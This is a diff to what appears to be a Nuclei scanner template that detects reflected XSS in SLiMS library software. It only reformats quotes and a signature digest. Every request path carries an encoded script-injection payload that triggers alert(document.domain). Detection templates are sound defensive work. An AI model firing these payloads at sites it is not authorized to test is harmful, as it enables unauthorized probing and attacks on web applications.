@@ -19,15 +19,15 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
-      - "{{BaseURL}}/library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member"
+      - '{{BaseURL}}/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      - '{{BaseURL}}/library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
 
     stop-at-first-match: true
     matchers-condition: and
@@ -41,9 +41,9 @@ http:
       - type: word
         part: content_type
         words:
-          - "text/html"
+          - 'text/html'
 
       - type: status
         status:
           - 200
-# digest: 490a0046304402203cdee76bbd2592c83418a6604b403c78bad6a1ad7d48490c5efd3850d7a2c463022054d7e1bef873953395ede290e780731761424d9dde1f83dd389207493541b900:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a0048304602210080effa277a99ef20fd60ba9f66f739c152b6ecd6b89a5ff125876145f6478fd7022100ee8e63febfed140737e58a928bcc024ea463964240425a299e8e6715d83a6192:922c64590222798bb761d5b6d8e72950
